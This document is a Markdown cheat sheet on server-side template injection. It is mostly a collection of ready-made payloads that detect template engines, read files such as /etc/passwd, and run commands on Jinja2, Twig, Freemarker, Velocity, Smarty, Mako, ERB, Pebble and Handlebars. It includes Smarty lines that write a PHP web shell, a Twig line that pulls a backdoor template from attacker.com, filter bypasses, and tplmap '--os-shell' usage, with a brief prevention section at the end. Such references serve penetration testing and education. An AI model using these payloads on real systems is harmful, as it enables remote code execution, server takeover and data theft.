# Server-Side Template Injection (SSTI)

## Description
SSTI occurs when user input is embedded into server-side templates in an unsafe way, allowing attackers to inject template directives. This can lead to information disclosure, remote code execution, and full server compromise.

## Detection

### Polyglot Payload
```
${{<%[%'"}}%\.
```

### Basic Detection by Engine
```
# Jinja2/Twig
{{7*7}}
${7*7}

# Freemarker
${7*7}
#{7*7}

# Velocity
#set($x=7*7)$x

# Smarty
{7*7}

# Mako
${7*7}

# ERB
<%= 7*7 %>

# Pebble
{{ 7*7 }}
```

## Template Engine Identification

```
          ${7*7}
          /    \
      49        ${7*7}
     /              \
  Jinja2/         Error
  Twig/          /    \
  Unknown    {{7*7}}  #{7*7}
             /    \      \
           49   Error   49=Freemarker
          Jinja2  Twig
```

## Jinja2 (Python)

### Basic Payloads
```python
{{ 7*7 }}
{{ config }}
{{ self.__init__.__globals__ }}
```

### Read Files
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items() }}
```

### RCE
```python
# Python 2
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# Python 3
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Via config
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Via request
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Universal (Python 3)
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
```

### Bypass Filters
```python
# No quotes
{{ lipsum.__globals__["os"].popen(request.args.cmd).read() }}
# URL: ?cmd=id

# Using attr
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2) }}

# Using format
{{ '%s'.__mod__(config) }}
```

## Twig (PHP)

### Basic Payloads
```twig
{{ 7*7 }}
{{ dump(app) }}
{{ app.request.server.all|join(',') }}
```

### RCE
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['cat /etc/passwd']|filter('exec')|join}}

{{'id'|filter('system')}}

{{_self.env.setCache("ftp://attacker.com/")}}{{_self.env.loadTemplate("backdoor")}}
```

## Freemarker (Java)

### Basic Payloads
```freemarker
${7*7}
${"freemarker.template.utility.Execute"?new()("id")}
```

### RCE
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

${"freemarker.template.utility.Execute"?new()("id")}

<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign rt=owc.newInstance().exec("id")>
```

### Read Files
```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

## Velocity (Java)

### Basic Payloads
```velocity
#set($x=7*7)$x
$class.inspect("java.lang.Runtime")
```

### RCE
```velocity
#set($s="")
#set($rt = $s.class.forName("java.lang.Runtime"))
#set($chr = $s.class.forName("java.lang.Character"))
#set($str = $s.class.forName("java.lang.String"))
#set($ex = $rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out = $ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

## Smarty (PHP)

### Basic Payloads
```smarty
{$smarty.version}
{php}echo `id`;{/php}
```

### RCE
```smarty
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

{system('id')}

{Smarty_Internal_Write_File::writeFile('/var/www/html/shell.php','<?php system($_GET["cmd"]); ?>',$smarty->_getSmartyObj())}
```

## Mako (Python)

### Basic Payloads
```mako
${7*7}
${self.module.runtime}
```

### RCE
```mako
<%
import os
x = os.popen('id').read()
%>
${x}

${self.module.cache.util.os.popen('id').read()}
```

## ERB (Ruby)

### Basic Payloads
```erb
<%= 7*7 %>
<%= Dir.entries('/') %>
```

### RCE
```erb
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

## Pebble (Java)

### Basic Payloads
```pebble
{{ 7*7 }}
```

### RCE
```pebble
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

## Handlebars (JavaScript)

### RCE
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Tools

### TInjA
```bash
# https://github.com/Hackmanit/TInjA
java -jar tinja.jar -u "https://target.com/page?name=SSTI"
```

### tplmap
```bash
# https://github.com/epinna/tplmap
python tplmap.py -u "https://target.com/page?name=*"
python tplmap.py -u "https://target.com/page?name=*" --os-shell
```

### SSTImap
```bash
# https://github.com/vladko312/SSTImap
python sstimap.py -u "https://target.com/page?name=test"
```

## Testing Checklist

- [ ] Test basic math expressions ({{7*7}})
- [ ] Identify template engine
- [ ] Test information disclosure
- [ ] Test file read capabilities
- [ ] Test for RCE
- [ ] Try filter bypasses
- [ ] Check for sandbox escapes

## Prevention

```python
# Use autoescape
from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(['html', 'xml']))

# Use sandbox
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# Never pass user input directly to template
# BAD:
template = Template(user_input)

# GOOD:
template = Template("Hello {{ name }}")
template.render(name=user_input)
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://portswigger.net/web-security/server-side-template-injection
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
